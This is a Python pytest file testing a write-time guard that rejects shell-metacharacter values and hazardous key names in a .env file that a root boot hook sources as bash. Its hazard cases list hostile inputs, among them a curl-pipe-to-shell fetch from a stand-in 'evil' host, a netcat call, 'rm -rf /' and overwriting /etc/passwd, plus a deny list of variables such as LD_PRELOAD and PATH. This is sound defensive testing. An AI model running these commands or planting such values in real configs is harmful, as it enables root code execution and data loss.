"""Tests for the .env write-time safety guard (design/70, P6).

The root boot hook sources $SYRVIS_HOME/config/.env as bash, so an unsafe value
(shell metacharacter) or an unsafe KEY NAME (PATH/LD_PRELOAD → poisoned
os.environ) is root code execution. These pin the guard at every writer.
"""

import pytest

from syrviscore.paths import (
    env_value_hazard,
    env_key_hazard,
    env_file_hazards,
)
from syrviscore.instance_bundle import InstanceBundle, InstanceBundleError


# ── env_value_hazard ─────────────────────────────────────────────────────────
@pytest.mark.parametrize("value", [
    "plainsecret",
    "AKIA1234567890",
    "a-token_with.dots-and-dashes",
    "https://ntfy.sh/abc123",
    "",                       # blank is safe (a KEY= line)
    "with spaces inside",     # internal spaces are fine
])
def test_value_safe(value):
    assert env_value_hazard(value) is None


@pytest.mark.parametrize("value", [
    "$(curl -sk http://evil/x|sh)",
    "`id`",
    "a;reboot",
    "a|nc evil 1",
    "a&&rm -rf /",
    "a>/etc/passwd",
    "back\\slash",
    "trailing ",             # trailing whitespace
    " leading",              # leading whitespace
    "line\nbreak",
])
def test_value_hazard(value):
    assert env_value_hazard(value) is not None


def test_value_hazard_names_char_not_value():
    # The reason must not echo the whole (possibly-secret) value.
    reason = env_value_hazard("supersecret$(evil)")
    assert "supersecret" not in reason
    assert "$" in reason


# ── env_key_hazard ───────────────────────────────────────────────────────────
@pytest.mark.parametrize("key", ["DOMAIN", "TUNNEL_TOKEN", "CF_DNS_API_TOKEN", "TZ", "_X"])
def test_key_safe(key):
    assert env_key_hazard(key) is None


@pytest.mark.parametrize("key", [
    "PATH", "IFS", "LD_PRELOAD", "LD_LIBRARY_PATH", "PYTHONPATH", "BASH_ENV",
    "DYLD_INSERT_LIBRARIES", "PROMPT_COMMAND", "GIT_SSH_COMMAND",
    "1BAD", "bad-key", "has space", "",
])
def test_key_hazard(key):
    assert env_key_hazard(key) is not None


# ── env_file_hazards ─────────────────────────────────────────────────────────
def test_file_hazards_scan():
    text = (
        "# a comment\n"
        "DOMAIN=konsume.org\n"
        "export TZ=America/Chicago\n"
        "FOO=$(evil)\n"
        "PATH=/tmp/attacker\n"
        "GOOD=plain\n"
    )
    findings = env_file_hazards(text)
    keys = {k for k, _ in findings}
    assert "FOO" in keys        # metacharacter value
    assert "PATH" in keys       # hazardous key name
    assert "DOMAIN" not in keys
    assert "GOOD" not in keys
    assert "TZ" not in keys


def test_file_hazards_clean():
    assert env_file_hazards("DOMAIN=x\nTZ=UTC\n") == []


# ── _parse_env integration (the seam writer's trust boundary) ────────────────
def _bundle_env(env):
    return {"env": env, "stack": None}


def test_parse_env_rejects_metachar_value():
    with pytest.raises(InstanceBundleError):
        InstanceBundle._parse_env({"DOMAIN": "konsume.org", "FOO": "$(id)"})


def test_parse_env_rejects_hazardous_key():
    with pytest.raises(InstanceBundleError):
        InstanceBundle._parse_env({"DOMAIN": "konsume.org", "LD_PRELOAD": "/tmp/x.so"})


def test_parse_env_accepts_safe():
    out = InstanceBundle._parse_env({"DOMAIN": "konsume.org", "TUNNEL_TOKEN": "abc.def-123"})
    assert out["DOMAIN"] == "konsume.org"
    assert out["TUNNEL_TOKEN"] == "abc.def-123"
